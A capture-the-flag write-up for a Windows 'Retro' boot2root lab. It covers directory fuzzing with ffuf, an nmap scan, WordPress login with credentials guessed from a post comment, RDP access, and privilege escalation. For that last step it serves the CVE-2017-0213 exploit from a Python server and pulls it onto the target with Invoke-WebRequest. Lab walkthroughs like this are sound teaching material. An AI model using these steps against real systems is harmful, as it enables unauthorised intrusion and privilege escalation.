# Retro

## Challenge Information

* **Challenge Name**: Retro
* **Category**: Boot2Root
* **Difficulty Level**: Hard

## Investigation Steps

1. **Perform Directory Traversal and Nmap Scan**: On starting the machine, I opened the the ipaddress in the browser and learned that it was a windows server. So, I planned to start with two main steps: 1st with directory traversal and the 2nd with namp scan.

   ```text
   ffuf -u http://10.201.11.140/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c -mc 200,301,302,403
   sudo nmap -Pn -sS -T4 -sV -O --open 10.201.87.142
   ```

   From the directory traversal, the main directory named **retro** was found where the main app for some games' information was running. This is the answer to the first question. Moreover, I found a rdp port **3389** open on which the actual **ms-wbt-server** was running.

2. **Enumerate the Retro Directory**: I also tried to find any more directory for **retro** where I found **wp-includes**, **wp-content** and **wp-admin** but all these were not accessible.

   ```text
   ffuf -u http://10.201.11.140/retro/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c -mc 200,301,302,403
   ```

   But when I tried to open **wp-admin**, it opened a local host page which tried to login using **wp-login.php**:

   ```text
   http://localhost/retro/wp-login.php?redirect_to=http%3A%2F%2F10.201.70.240%2Fretro%2Fwp-admin%2F&reauth=1
   ```

   When I tried to open this login page on retro directory on the target ip, it opened a wordpress login page.

3. **Find the WordPress Credentials**: Before that, lets focus the webpage running on retro. The author of all the posts is "Wade". Maybe a user of this name exists in the server. On trying this username and a random password, the error message proved that this is one of the correct usernames to login. Now we have to find out a correct password.

   Lets see all the posts done by wade. There is a post with title **Ready Player One**. Click on this post to show more details. In the comments, he have put a comment with the name of his favourite character's avatar so that he may not forget its pronounciation. Lets try this as the password. And Boom! it really worked! We can use these credential to login to the wordpress site as well as the rdp:

   ```text
   username: wade
   password: parzival
   ```

   There is the user.txt file present on the desktop.

4. **Escalate Privileges**: Now to find the root flag, lets try to elevate privileges. Lets try to find the exploit for the current windows server being run here. Find out its information using command `sysinfo`.

   We can look for various exploit present on `https://github.com/SecWiki/windows-kernel-exploits/tree/master`.

   Here we have an exploit `CVE-2017-0213`. Download it and host it on a python server so that we can download the exe file on the target using our attacking machine using the following commands:

   ```text
   python -m http.server 8080 # attacking machine

   Invoke-WebRequest -Uri "http://10.8.37.243:8080/CVE-2017-0213_x64.exe" -OutFile "C:\Users\Wade\Desktop\CVE-2017-0213_x64.exe" # target machine
   ```

   This exe file will invoke a new powershell with elevated privileges. We can verify it using the command `whoami`. Now read the root file present on the Administrator's desktop.

---
